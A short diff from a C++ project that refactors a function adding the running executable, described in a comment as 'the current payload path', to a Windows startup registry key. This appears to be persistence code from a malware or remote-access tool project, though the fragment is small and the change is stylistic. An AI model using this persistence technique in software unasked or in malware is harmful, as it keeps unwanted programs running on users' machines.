@@ -5,10 +5,8 @@
 // Creates a registry entry and sets its value to the current payload path.
 void registry::add_to_startup() noexcept
 {
-    HKEY hkey;
-
-    if (!RegCreateKeyExW(HKEY_CURRENT_USER, LP_SUB_KEY, 0, NULL, REG_OPTION_NON_VOLATILE,
-        KEY_WRITE, NULL, &hkey, NULL))
+    if (HKEY hkey; !RegCreateKeyExW(HKEY_CURRENT_USER, LP_SUB_KEY, 0, NULL, REG_OPTION_NON_VOLATILE,
+                                    KEY_WRITE, NULL, &hkey, NULL))
     {
         WCHAR executable_path[MAX_PATH];
         GetModuleFileNameW(NULL, executable_path, MAX_PATH);
